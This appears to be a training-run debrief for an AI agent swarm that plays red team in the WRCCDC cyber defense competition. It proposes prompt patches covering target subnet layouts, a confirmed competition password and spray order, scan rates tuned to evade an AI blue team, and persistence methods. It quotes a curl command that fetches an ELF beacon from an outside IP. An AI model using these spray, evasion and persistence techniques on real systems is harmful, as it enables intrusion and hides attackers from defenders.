# Debrief Queue — Training Run Findings

Maintained by: TRAIN-002 (Training Evaluator), dispositioned by operator, consumed by TRAIN-003 (Prompt Patcher)
Purpose: Structured list of issues identified during a training run, each with a disposition category that determines the corrective action. After operator review and disposition confirmation, items marked PROMPT-FIX, TEMPLATE-FIX, or WORKFLOW-FIX are sent to TRAIN-003 for patch generation.

## Active Debrief

Source run: PCAP Analysis — 2026-quals (manual findings, no /training-run)
Date: 2026-03-16
Operator: —
Status: CLOSED — patch-20260316-1.md generated

---

## Disposition Legend

PROMPT-FIX: a competition agent's system prompt needs a correction (add knowledge, fix command template, adjust decision framework, improve refusal handling).

TEMPLATE-FIX: a coordination file template needs revision (add/rename column, change status values, adjust format, add documentation).

WORKFLOW-FIX: a slash command workflow needs adjustment (change agent invocation order, add verification step, modify output format, adjust handoff).

OPERATOR-TRAINING: the operator needs to learn something — not a swarm issue (tool usage, workflow optimization, expectation alignment).

WONTFIX: acceptable limitation — document the manual fallback. Operator provides rationale.

NEEDS-TRIAGE: unclear categorization — requires operator discussion to disposition.

## Findings

### Finding #1

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 has no knowledge of the WRCCDC 2026 team subnet layout. Without this, it recommends full blind discovery scans rather than targeted scans against known host positions, wasting the critical early window.
Evidence: 2026-quals traffic confirms all 30 teams use 10.100.1XX.0/24 with identical host-role-per-address scheme (.14=DC, .20=WordPress, .22=WinRM, .2=primary Linux, etc.). RECON-001's current prompt contains no year-specific topology data.
Root cause: PCAP intelligence not yet embedded in agent prompts — this is the first PCAP analysis run.
Proposed fix: Add "WRCCDC 2026 Network Layout Pattern" subsection to RECON-001's system prompt under Common CCDC Infrastructure Patterns. Include full address-to-role map, priority host list (.2, .14, .20, .22), shared segment (10.100.100.0/24), and scoring engine IP (10.2.1.5).

### Finding #2

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 recommends masscan-style full-rate scanning with no AI blue team calibration. 2026-quals data shows masscan at ~180 pps triggers SSH firewall within 17 minutes by human teams — an AI blue team will respond in 2–3 minutes, invalidating any scan that takes longer.
Evidence: tshark analysis of 2026-quals PCAPs shows SYN flood signature (paired SYNs within 40μs, window 1024, TTL 36, MSS-only options) and SSH host count drop from 43 → 5 at T+17min. AI blue team equivalent response estimated at 2–3 minutes based on log-correlation capability.
Root cause: RECON-001 has no AI blue team response timing model; defaults to standard CCDC scan cadence.
Proposed fix: Add "Scan Rate Calibration for AI Blue Team" section to RECON-001. Include: no full-rate masscan, use nmap -T2/-T1 against known ports only, leverage known layout to skip discovery, limit to ports 22/80/389/443/445/3389/5985, distribute across multiple source IPs, target completion within 5 minutes.

### Finding #3

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no 2026-specific credential intelligence. The 2026 quals established a confirmed working credential, AD domain, username format, password pattern, and spray priority order that are all directly reusable at 2026 Regionals.
Evidence: WordPress admin:WaterIsWet?? verified by scoring engine traffic. Domain rmwpra.hydration confirmed in NTLM spray traffic. AD usernames FIRSTNAME_LASTNAME (all-caps, underscore) observed across 5 spray sources. Password pattern: [ThemeWord][Adjective][SpecialChars]. SSH spray window: T+0 to T+15min before firewall deployment.
Root cause: No prior PCAP analysis had been run; credential intelligence not embedded.
Proposed fix: Add "2026 Competition Credential Intelligence" section to EXPLOIT-001. Include domain, confirmed credential, password pattern, AD username format with examples, service accounts (Administrator, backup), and prioritized spray order (SSH first → LDAP/SMB → WordPress → WinRM). Add note about scoring engine: do not change admin:WaterIsWet?? password on compromised WordPress hosts.

### Finding #4

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 lacks specific 2026 red team traffic signatures that the AI blue team will have been trained on. Without these, EVADE-001 cannot warn the operator away from burned patterns or recommend specific mitigations.
Evidence: Four distinct burned signatures identified in 2026-quals PCAPs: (1) masscan TCP fingerprint (window 1024, TTL 36, paired SYNs), (2) curl C2 beacon (GET /JSyausLR/LinIUpdater, periodic ~30–60s), (3) NTLM spray clustering (10+ sources, same timestamps, port 389), (4) WinRM POST /wsman from non-admin IP.
Root cause: No prior PCAP analysis; burned signatures not documented in agent prompts.
Proposed fix: Add "2026 Red Team Signatures to Avoid (BURNED PATTERNS)" section to EVADE-001. Include all four signatures with specific TCP/HTTP field values, detection likelihood against AI blue team, and per-signature mitigations. Add AI-specific general mitigations: vary scan source IPs per team, HTTPS C2 only, browser UA strings, legitimate-looking paths.

### Finding #5

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: BLOCKING
Category: TIMING

Description: OPS-001's phase timing model is calibrated for human blue teams (~17 minute SSH response window). Against an AI blue team, this model produces catastrophically wrong time budgets — the actual initial access window is 2–3 minutes, not 17. An OPS-001 operating with the wrong timing model will recommend spending time on discovery when the window has already closed.
Evidence: 2026-quals: SSH firewall deployed at T+17min by human teams. AI blue team log-correlation capability implies 2–3 minute equivalent. Current OPS-001 prompt references CCDC defaults with no AI blue team timing adjustment.
Root cause: No AI blue team timing model exists in OPS-001; defaults to human-defender assumptions.
Proposed fix: Add "2026 Competition Phase Timing" section to OPS-001. Include the full observed 2026 quals timeline, adjusted AI blue team timeline (T+0–3min undetected window, T+5min window closes), and recommended three-phase structure: Phase 1 (T+0–5, ultra-fast targeted credential spray), Phase 2 (T+5–30, exploit + encrypted persistence), Phase 3 (T+30+, encrypted channels only).

### Finding #6

Disposition: PROMPT-FIX
Agent: PERSIST-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: PERSIST-001 may recommend or fail to warn against HTTP-based implant delivery (curl download + cron execution), which is the exact technique used in 2026 quals. This technique is trivially detected by an AI blue team within 2 minutes and would result in rapid persistence removal.
Evidence: 2026-quals: curl http://10.230.87.61/JSyausLR/LinIUpdater ELF beacon at ~30–60s intervals ran undetected for 115 minutes against HUMAN teams. AI blue team HTTP log correlation would flag this immediately. No current warning in PERSIST-001 about this pattern.
Root cause: 2026 quals technique is not documented as burned in PERSIST-001; agent has no AI-blue-team-specific persistence guidance.
Proposed fix: Add "2026 Quals Persistence Technique — DO NOT REUSE" section to PERSIST-001. Document the exact technique, explain the four reasons it fails against AI blue team (HTTP logging, periodic beacon signature, no encryption, ELF-over-HTTP flagging), and provide preferred alternatives: SSH authorized_keys injection, cron with existing binaries, systemd oneshot service, SSH tunneling for C2, HTTPS C2 with jittered timing and browser UA.
